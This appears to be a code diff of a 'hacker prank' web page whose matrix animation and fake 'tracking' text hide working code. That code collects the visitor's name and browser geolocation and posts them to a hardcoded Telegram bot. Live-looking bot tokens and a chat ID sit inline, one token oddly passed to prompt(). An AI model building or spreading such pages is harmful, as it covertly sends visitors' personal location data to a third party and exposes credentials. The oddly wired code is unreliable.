@@ -28,7 +28,7 @@ body {
   padding: 20px;
 }
 
-/* main msg */
+/* main */
 #main {
   display: none;
   position: absolute;
@@ -116,11 +116,11 @@ canvas {
 
 <script>
 
-// 🔐 TELEGRAM DETAILS (APNE DALNA)
-let BOT_TOKEN = prompt("8722336483:AAG32SwyqJCRV5eaOiH06r08BbYBi5t7WvA")
+// 🔐 TELEGRAM (अपना डाल)
+let BOT_TOKEN = prompt("8785634627:AAGzqNZedR8vltdpzkKY4fAkFmMJ5rzC3VQ");
 let CHAT_ID = "5992250834";
 
-// 📩 SEND TO TELEGRAM
+// 📩 TELEGRAM SEND
 function sendToTelegram(name, location) {
   let msg = "🔥 New Visitor\n\nName: " + name +
             "\nLocation: " + location +
@@ -134,7 +134,10 @@ function sendToTelegram(name, location) {
       chat_id: CHAT_ID,
       text: msg
     })
-  });
+  })
+  .then(res => res.json())
+  .then(data => console.log("Telegram:", data))
+  .catch(err => console.error("Error:", err));
 }
 
 // 📍 LOCATION
@@ -157,11 +160,13 @@ function getLocation(name) {
 // 🔥 NAME INPUT
 let userName = prompt("Enter your name 😎");
 
-// VALIDATION
-let validName = /^[A-Za-z ]+$/;
+if (!userName) userName = "";
+userName = userName.trim();
 
-if (!userName || !validName.test(userName)) {
+// only letters + space (min 2 char)
+let validName = /^[A-Za-z ]{2,30}$/;
 
+if (!validName.test(userName)) {
   document.getElementById("error").style.display = "block";
   document.body.style.background = "red";
   document.body.classList.add("shake");
@@ -173,14 +178,12 @@ if (!userName || !validName.test(userName)) {
   throw new Error("Invalid Name");
 }
 
-// 👉 location + telegram call
-getLocation(userName);
-
-// START
+// START ALL (click)
 function startAll() {
   playMusic();
   vibratePhone();
   document.body.classList.add("shake");
+  getLocation(userName); // 👈 यहीं से permission आएगी
 }
 
 // music
@@ -195,7 +198,7 @@ function vibratePhone() {
   }
 }
 
-// hacker text
+// hacker animation
 let lines = [
   "Initializing system...",
   "Tracking user: " + userName + "...",
@@ -233,7 +236,7 @@ function showMessage() {
 
 typing();
 
-// matrix
+// matrix effect
 let canvas = document.getElementById("matrix");
 let ctx = canvas.getContext("2d");
 
